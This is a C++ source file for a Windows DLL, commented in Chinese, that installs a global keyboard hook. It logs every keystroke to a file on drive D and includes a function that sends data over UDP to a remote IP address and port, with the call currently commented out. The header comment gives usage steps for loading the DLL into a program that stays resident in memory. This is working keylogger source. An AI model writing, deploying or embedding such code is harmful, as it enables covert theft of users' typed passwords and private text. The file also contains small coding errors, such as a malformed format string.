// hoookdll.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include <stdio.h>
#include "pub.h"

/* dll使用说明

第一步：将hookdll.h和hookdll.lib加入到项目中

第二步：在项目的cpp文件中加入
#include "hookdll.h"
#pragma comment(lib, "hookdll.lib")

第三步：在程序开始执行的时候调用
	InstallLaunchEv();

第四步：程序常驻内存

第五步：程序退出时调用
	UnInstallLaunchEv();

第六步：将hookdll.dll拷贝到项目编译后的可执行文件目录下

*/

HHOOK Hook;
LRESULT CALLBACK LauncherHook(int nCode, WPARAM wParam, LPARAM lParam);
void strerror(DWORD errno);
void savelog(const char *s);
void send_udp(const char *s);
extern HMODULE hHookDll;

__declspec(dllexport) void WINAPI UnInstallLaunchEv() // dll的导出函数
{
	UnhookWindowsHookEx(Hook);
}


__declspec(dllexport) void WINAPI InstallLaunchEv() // dll的导出函数
{
	// HMODULE hHookDll = LoadLibrary("hookdll"); // 得到dll的句柄

	// install keyboard hook to trap all keyboard message
	Hook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)LauncherHook, hHookDll, 0);// 0 代表全局的Hook
	if (Hook == NULL)
	{
		strerror(GetLastError());
	}
}

LRESULT CALLBACK LauncherHook(int nCode, WPARAM wParam, LPARAM lParam) // dll内部使用的函数
{
	LRESULT Result = CallNextHookEx(Hook, nCode, wParam, lParam);

	if (nCode == HC_ACTION)
	{
		char buf[100];
		//memset(buf, 0, sizeof(buf));
		//sprintf(buf, "%u", wParam); // 参数wParam为键盘扫描码
		//send_udp(buf); // 向远程主机发送udp消息

		memset(buf, 0, sizeof(buf));
		sprintf(buf, "%x\t%c\t%08\n", wParam, wParam, lParam); //将参数wParam, lParam写入buf
		savelog(buf); //发完之后写log日志
	}
	return Result;
}

void send_udp(const char *s)//向目标主机发送udp消息
{
	init_socket();
	SOCKET st = create_send_socket();
	send_work(st, "10.200.247.75", 8080, s);
	close_socket(st);
}

void savelog(const char *s)
{
	FILE *p = fopen("D:\\myhook.log", "a+");
	fputs(s, p);
	fclose(p);
}

void strerror(DWORD errno) //根据GetLastError()返回值，将错误信息转化为中文，写入myhook.log中
{
	void *lpMsgBuf;
	FormatMessageA(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		errno,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(char *) &lpMsgBuf,
		0,
		NULL
		);

	savelog((const char *) &lpMsgBuf);
	LocalFree(lpMsgBuf);
}